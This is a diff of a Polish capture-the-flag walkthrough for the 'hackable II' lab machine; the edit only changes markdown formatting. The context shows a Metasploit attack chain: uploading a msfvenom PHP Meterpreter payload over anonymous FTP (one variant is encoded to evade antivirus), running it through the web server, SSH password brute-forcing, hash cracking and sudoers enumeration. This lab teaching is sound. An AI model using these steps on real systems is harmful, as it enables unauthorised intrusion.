@@ -66,7 +66,7 @@ msf6 auxiliary(scanner/ftp/anonymous) > run
 [*] 172.16.1.244:21       - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
-Można wejść. Na **FTP** jest plik **CALL.html**, można też wrzucać swoje pliki, więc mamy podatność.
+Można wejść. Na **FTP** jest plik _CALL.html_, można też wrzucać swoje pliki, więc mamy podatność.
 {: .text-justify}
 ```
 -rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
@@ -115,7 +115,7 @@ msf6 auxiliary(scanner/ftp/anonymous) > wmap_vulns -l
 [*]     file File found.
 [*]     GET Res code: 301
 ```
-Voilà – jest katalog __files__, a w nim plik __CALL.html__, tak jak na było **FTP**. To jest to samo, tylko widoczne z innych źródeł. Wchodząc na __http://172.16.1.244/files/CALL.html__ nic ciekawego nie znajdziemy, chociaż w tytule strony jest **onion**. Nazwa nam nic nie mówi. Jednak wychodzi, że strona **WWW** jest powiązana z **FTP**. Przez **FTP** wrzucamy plik, a przez **WWW** go odpalamy. Oczywiście do tego użyjemy **Metasploit**a (oprócz wrzutki przez **FTP**). Najlepsze ładunki są z ładunkiem **Meterpreter**a, więc ich szukajmy:
+Voilà – jest katalog _files_, a w nim plik _CALL.html_, tak jak na było **FTP**. To jest to samo, tylko widoczne z innych źródeł. Wchodząc na _http://172.16.1.244/files/CALL.html_ nic ciekawego nie znajdziemy, chociaż w tytule strony jest **onion**. Nazwa nam nic nie mówi. Jednak wychodzi, że strona **WWW** jest powiązana z **FTP**. Przez **FTP** wrzucamy plik, a przez **WWW** go odpalamy. Oczywiście do tego użyjemy **Metasploit**a (oprócz wrzutki przez **FTP**). Najlepsze ładunki są z ładunkiem **Meterpreter**a, więc ich szukajmy:
 {: .text-justify}
 ```bash
 # root@kali:~# msfvenom -p php/meterpreter/bind_tcp LPORT=5555 > php_meterpreter_bind_tcp.php
@@ -130,7 +130,7 @@ Jeżeli nam **Windows** wykryje, że ten ładunek to wirus, to należy go zaciem
 ```bash
 # root@kali:~# msfvenom -e php/base64 -p php/meterpreter/bind_tcp LPORT=5555 > php_meterpreter_bind_tcp.php
 ```
-Do katalogu __files__ wrzucamy __php_meterpreter_bind_tcp.php__, ale zanim odświeżymy i uruchomimy na stronie, to załadujmy nasz ładunek i exploita w **Msfconsole**:
+Do katalogu _files_ wrzucamy _php_meterpreter_bind_tcp.php_, ale zanim odświeżymy i uruchomimy na stronie, to załadujmy nasz ładunek i exploita w **Msfconsole**:
 {: .text-justify}
 ```bash
 msf6 > use exploit/multi/handler
@@ -219,13 +219,13 @@ msf6 post(linux/gather/enum_system) > run
 [*] Post module execution completed
 msf6 post(linux/gather/enum_system) > loot
 ```
-komenda __loot__ pozwala nam wyświetlić, to co ściągnęliśmy.
+komenda _loot_ pozwala nam wyświetlić, to co ściągnęliśmy.
 {: .text-justify}
 w pliku **20210729214957_default_172.16.1.244_linux.enum.syste_656649.txt** mamy użytkowników z podatnej maszyny
 {: .notice--info}
 moduł **post/linux/gather/enum_users_history** sciagnie nam plik **Sudoers**
 {: .notice--info}
-Moduł **auxiliary/scanner/ssh/ssh_login** pozwala nam dosyć pobieżnie przeskanować użytkowników i przy okazji ustawić sesję, jeżeli login i hasło będą poprawnę. Również może się przydać do ustawienia sesji w **Metasploicie**, jeżeli znamy tylko login i hasło. Sprawdźmy czy użytkownicy mają jakieś słabe hasła na systemie. Niestety ten moduł jest dosyć wolny, ale może coś znajdziemy. W parametrach podajemy, żeby używał hasła jako loginu, również podajemy ścieżkę do pliku gdzie zostali zapisani użytkownicy z obrazu **hackable II**. __Verbose__ należy ustawić na __yes__, wtedy widać na bieżąco pracę modułu.
+Moduł **auxiliary/scanner/ssh/ssh_login** pozwala nam dosyć pobieżnie przeskanować użytkowników i przy okazji ustawić sesję, jeżeli login i hasło będą poprawnę. Również może się przydać do ustawienia sesji w **Metasploicie**, jeżeli znamy tylko login i hasło. Sprawdźmy czy użytkownicy mają jakieś słabe hasła na systemie. Niestety ten moduł jest dosyć wolny, ale może coś znajdziemy. W parametrach podajemy, żeby używał hasła jako loginu, również podajemy ścieżkę do pliku gdzie zostali zapisani użytkownicy z obrazu **hackable II**. _Verbose_ należy ustawić na _yes_, wtedy widać na bieżąco pracę modułu.
 {: .text-justify}
 ```bash
 msf6 auxiliary(scanner/ssh/ssh_login) > run
@@ -299,7 +299,7 @@ msf6 auxiliary(scanner/ssh/ssh_login) > run
 [*] Auxiliary module execution completed
 ```
 ## Wchodzimy na serwer
-Użytkownik __ftp__ ma hasło __ftp__ :smiley: Mamy też na to sesję. Żeby połączyć się z wygodnym **Meterpreterem** użyjemy modułu **multi/manage/shell_to_meterpreter**. W module wpisujemy nr sesji. Teraz już zwykłe szukanie dziury w całym… ;) W katalogu __/home__ jest plik __important.txt__. W nim zaś zawartość:
+Użytkownik _ftp_ ma hasło _ftp_ :smiley: Mamy też na to sesję. Żeby połączyć się z wygodnym **Meterpreterem** użyjemy modułu **multi/manage/shell_to_meterpreter**. W module wpisujemy nr sesji. Teraz już zwykłe szukanie dziury w całym… ;) W katalogu _/home_ jest plik _important.txt_. W nim zaś zawartość:
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 important.txt
@@ -346,13 +346,13 @@ echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
 </p>
 </pre>
 </div>
-Na samym dole jest hasło. **Hashcat** i słownik __rockyou.txt__ szybko się z nim uporają. Hasło to **onion**, ale przecież to było w tytule strony __http://172.16.1.244/files/CALL.html__. Proste maszyny do złamania czasami są bardzo proste.
+Na samym dole jest hasło. **Hashcat** i słownik _rockyou.txt_ szybko się z nim uporają. Hasło to **onion**, ale przecież to było w tytule strony _http://172.16.1.244/files/CALL.html_. Proste maszyny do złamania czasami są bardzo proste.
 {: .text-justify}
 Wchodzimy na konto **shrek**a.
 ```bash
 # cat user.txt
 ```
-Wyświetli się obrazek (sam zobacz jaki :smiley: ). Jeszcze zostało wejść na **root**a. Mamy plik __Sudoers__, a tam jest taka ciekawa linijka:
+Wyświetli się obrazek (sam zobacz jaki :smiley: ). Jeszcze zostało wejść na **root**a. Mamy plik _Sudoers_, a tam jest taka ciekawa linijka:
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 Sudoers
